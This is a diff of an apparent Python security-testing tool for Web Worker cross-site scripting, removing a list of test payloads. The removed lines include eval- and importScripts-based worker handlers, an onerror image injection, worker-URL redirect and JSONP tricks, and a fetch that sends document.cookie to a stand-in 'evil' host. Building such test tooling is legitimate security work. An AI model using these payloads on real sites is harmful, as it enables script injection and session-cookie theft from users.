@@ -371,22 +371,3 @@ def build_poc_html(
 </script>
 </body></html>
 """
-
-
-def dangerous_payloads() -> list[str]:
-    """High-yield payloads for Web Worker XSS testing."""
-    return [
-        # Worker script body payloads
-        "onmessage=e=>eval(e.data);",
-        "onmessage=e=>new Function(e.data)();",
-        "onmessage=e=>importScripts(e.data);",
-        "onmessage=e=>setTimeout(e.data,0);",
-        "self.addEventListener('message',e=>postMessage(e.data));",
-        # Page-side payloads (posted to the worker)
-        "alert(1)",
-        "<img src=x onerror=alert(1)>",
-        "fetch('//evil/?c='+document.cookie)",
-        # Worker URL payloads (when new Worker() takes user input)
-        "/redirect?to=//evil/w.js",
-        "//victim.example/jsonp?cb=onmessage=e=>eval(e.data)//",
-    ]
